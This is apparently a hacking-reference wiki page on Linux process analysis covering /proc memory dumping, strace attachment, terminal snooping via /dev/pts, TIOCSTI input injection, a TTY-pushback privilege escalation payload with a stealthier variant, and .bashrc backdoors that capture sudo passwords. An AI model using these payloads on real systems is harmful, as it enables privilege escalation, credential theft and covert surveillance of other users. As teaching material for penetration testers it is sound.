---
description: >-
  Find detailed information about other running processes using the /proc folder
  and other tricks
---

# Analyzing Processes

## `/proc`

This folder on a Linux system holds all the information about running processes. From their memory to their executable, or the files they have open. Every process has a unique Process ID (PID). In the `/proc/[PID]` directory, you can find information specific to that certain process. Here are a few interesting files:

* `/proc/[PID]/cmdline`: **Command line arguments** passed to the program on startup (`\x00` byte as separator)
* `/proc/[PID]/exe`: A symbolic link to the **executable** file that was used to start the process
* `/proc/[PID]/environ`: **Environment variables** for the process (`\x00` byte as separator)
* `/proc/[PID]/fd/`: A **directory** that contains symbolic links to the **opened files** of the process
* `/proc/[PID]/maps`: Information about the **memory mappings** for the process, including the **addresses** and **permissions** of each mapping
* `/proc/[PID]/mem`: A file representing the process's memory which should not be world-readable, only root and the owner of the process. Combined with the `maps` file it can be used to obtain a full memory dump of the process (see [#dump-memory-from-proc](analyzing-processes.md#dump-memory-from-proc "mention"))

If you `ls` the directory, you will find all the files and their permissions, these are just a few useful ones.&#x20;

### Dump memory from /proc

By combining the `maps` and `mem` files of a process, one can extract the loaded memory regions to find exactly what is in the memory of the program. This can be used to find secrets or anything that might be loaded in there. Using the following bash functions you can easily dump the memory of a process into the current directory ([source](https://serverfault.com/questions/173999/dump-a-linux-processs-memory-to-file/970213#970213)):

```bash
procdump() ( 
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
)
```

After defining it like this, you can take a PID and dump it:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ prodump 1337
</strong>1337_mem_7fcddc835000.bin
...
</code></pre>

### `/proc/self`

This is a special directory, that links to the **current process**'s `/proc` folder. If you don't know the PID for example, you can read any files in here like `/proc/self/environ` to read it from the process that is executing the file read, without having to guess anything. But note that the Process IDs are very predictable, and can be brute-forced easily with a script to find all processes.&#x20;

## `strace`

[strace](https://man7.org/linux/man-pages/man1/strace.1.html) is a Linux tool that **traces syscalls**. You can attach it to a process, and it will print all the syscalls and their parameters that are being called when they happen. This can be incredibly insightful when reverse engineering what a process is doing, as you can interactively see calls that normally happen in the background.&#x20;

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ strace ./binary
</strong>execve("./binary", ["./binary"], 0x7ffe2c32ca40 /* 41 vars */) = 0
brk(NULL)                               = 0x555b9afcc000
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f84f4653000
...
</code></pre>

Even better, you can also **attach** it to **other processes** just requiring a Process ID (PID). You just need permission to read the necessary files, which only the root user and owner of the process has. If a process is running as your user, but in another terminal you don't have access to for example, this can attach to the process and give you a lot of information.&#x20;

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ strace -p 1337
</strong>strace: Process 72722 attached
restart_syscall(&#x3C;... resuming interrupted read ...>) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
</code></pre>

{% hint style="info" %}
For extracting useful information from these syscalls, you will often see arguments **truncated** to 32 characters **by default**. You can change this limitation using the **`-s` argument** and provide a much larger maximum to get the full data.&#x20;

```shell-session
$ strace -p 1337 -s 99999
```
{% endhint %}

## `/dev/pts` (terminals)

There are pseudo-terminals in the `/dev/pts` directory, that you might see the TTY column of a `ps` or `w` command.&#x20;

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ ps auxt | grep pts
</strong>user     658  0.0  0.0  10496  5488 pts/0    Ss+  17:17   0:00 -bash
</code></pre>

These can give you access to the input of the process, meaning you can read the input that is going through the terminal on the other side, as well as write your own into it.&#x20;

{% hint style="warning" %}
Due to a **race condition** of both processes trying to read the same data at the same time, you might not receive all data, as only one can actually receive it
{% endhint %}

<pre class="language-shell-session"><code class="lang-shell-session"># # Read per character and print as hex
<strong>$ while true; do cat /dev/pts/1; done 2>/dev/null | xxd -c1
</strong>00000000: 68  h
00000001: 65  e
00000002: 6c  l
00000003: 6c  l
00000004: 6f  o
# # Print as raw text and output file
<strong>$ while true; do cat /dev/pts/1; done 2>/dev/null | tee /tmp/out
</strong>hello
</code></pre>

### Send STDIN to TTY

Send accepted standard input to a TTY to influence the behavior, or maybe execute commands ([source](https://unix.stackexchange.com/a/48221)).&#x20;

{% code title="tty.pl" %}
```perl
require "sys/ioctl.ph";
ioctl(STDOUT, &TIOCSTI, $_) for split "", <STDIN>;
```
{% endcode %}

```bash
echo 'id' | sudo perl tty.pl > /dev/pts/1
```

### TTY Input Pushback (`su`)

{% embed url="https://www.halfdog.net/Security/2012/TtyPushbackPrivilegeEscalation/" %}
Explainer of the technique in the context of `su` and virtual machines
{% endembed %}

When logging in as another user with `su`, by default, the current pseudo-terminal is _reused_. This has the effect that the low-privileged user that is logged in to can send input to the TTY.&#x20;

The trick we abuse is to **background** the current process programmatically, and then **keep sending input** to the TTY. After backgrounding the shell will be back to where it previously was: the original high-privileged shell that executed `su` in the first place. The input we send will then end up in that higher-up shell thus allowing malicious commands to be written and executed.&#x20;

In practice, you will create some code in `~/.bashrc` that will do these actions right as the admin or cron job tries to log into your account. Here is an example that creates and compiles a C program with a specific command:

{% code title="/tmp/payload.py" %}
```renpy
import fcntl
import termios
import os
import sys
import signal

os.kill(os.getppid(), signal.SIGSTOP)

for char in sys.argv[1] + '\n':
    fcntl.ioctl(0, termios.TIOCSTI, char)
```
{% endcode %}

{% code title="/home/hacker/.bashrc" %}
```bash
python3 /tmp/payload.py "id > /tmp/pwned"
```
{% endcode %}

{% hint style="info" %}
If `cc` or another compiler isn't available, try compiling it yourself on another comparable system with `cc -static` to link libraries statically
{% endhint %}

When that payload is placed on the `hacker` account for example, and the `admin` user tries to log in using `su hacker`, this payload executes in their terminal:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>admin@machine$ su hacker  # Trigger
</strong>Password:
exit
id > /tmp/pwned

hacker@machine$ exit
exit
<strong>admin@machine$ id > /tmp/pwned
</strong>admin@machine$ 

<strong>$ cat /tmp/pwned  # Payload was executed
</strong>uid=1000(admin) gid=1000(admin) groups=1000(admin)
</code></pre>

{% hint style="success" %}
If `sudo su [username]` was used, you can even **reuse** `sudo` in your payload as the _sudo token_ will still be valid (the timeout not requiring entering a password again)
{% endhint %}

#### More stealthy flow

In the above example, an administrator can clearly see that something is up, as the whole payload is shown directly in their screen, twice even. The history files keep this payload, and they can always check the `.bashrc` file to find the payload.&#x20;

To create a more realistic `su` experience, the entered commands should be hidden and the sequence should actually end up in a `hacker@machine` shell like the administrator expects. These two can both be done relatively easily by just editing the payload to include some more tricks:

1. Use `\x0C` characters to _clear the screen_ after each command, hiding the process
2. Prefix all commands with a   space character, which hides it from the history file
3. After backgrounding the process, use `fg` to get back to the `hacker@machine` shell
4. Run `clear` to completely clear all previous commands

{% code title="/home/hacker/.bashrc" %}
```bash
echo 'id > /tmp/pwned' > /tmp/s
chmod 777 /tmp/s
cmd=$' /tmp/s &> /dev/null\n\x0C fg\n\x0C clear'

python3 /tmp/payload.py "$cmd"
```
{% endcode %}

## Other tricks

A few more tricks that may be useful in some cases, highly specific to the type of processing that is running.&#x20;

### Backdoor `~/.bashrc`

When a victim logs in as a user where you can write their .bashrc file, you can make them execute arbitrary commands before starting their shell (such as a reverse shell). To get a **clean log** of the STDIN, STDOUT and STDERR combined into one file as output you can use a command like this as the backdoor:

<pre class="language-bash" data-title=".bashrc"><code class="lang-bash"><strong>script -qfc /bin/bash /tmp/out
</strong></code></pre>

This command won't capture the STDIN of a password input for example, **only what is displayed** on the screen. If a user or an automated system tries to type into a hidden input like the `sudo` prompt, you can try to **capture all the input** using the `cat` command without any arguments:

<pre class="language-bash" data-title=".bashrc"><code class="lang-bash"><strong>cat > /tmp/out
</strong></code></pre>

### Enable history files

Sometimes a machine will try to prevent a system from logging executed commands in the history file. In bash, the `~/.bash_history` file for example will contain all the commands executed in an interactive bash shell, which may contain sensitive information like passwords or other secrets.&#x20;

These can be disabled by symlinking them to `/dev/null`, but if we have permission, we can simply **delete the history file** to unlink the symlink. When the next command is then executed, it will find that there is no file anymore and just create a new one with the history.&#x20;

This idea of resetting the `~/.bash_history` file may also work for other programs whose history file is symlinked to `/dev/null`. This depends on the process, but some interactive ones have their own history file.&#x20;
